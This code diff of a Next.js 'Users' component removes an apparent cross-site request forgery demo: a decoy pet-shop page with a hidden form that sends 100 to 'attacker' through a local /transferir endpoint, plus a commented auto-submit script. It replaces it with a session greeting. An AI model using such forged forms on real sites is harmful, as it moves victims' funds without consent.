@@ -1,19 +1,14 @@
-export default async function Users() {
+'use client'
+
+import { authClient } from "@/lib/auth-client" // import the auth client
+
+export default function Users() {
+    const { data } = authClient.useSession()
+    console.log(data)
+
     return (
         <div>
-            <h1>Loja de acessórios pet</h1>
-            <a href="">Clique nos produtos</a>
-            <p>Nossos produtos pet de alta qualidade!</p>
-
-            <form action="http://localhost:3333/transferir">
-                <input type="hidden" name="recipient" value="attacker" />
-                <input type="hidden" name="amount" value="100" />
-            </form>  
-            
-            {/* <script>
-                const form = document.querySelector('form')
-                form.submit();
-            </script> */}
+            <p>Seja-bem, vindo, <b>{data?.user.name}</b></p>
         </div>
     )
 }
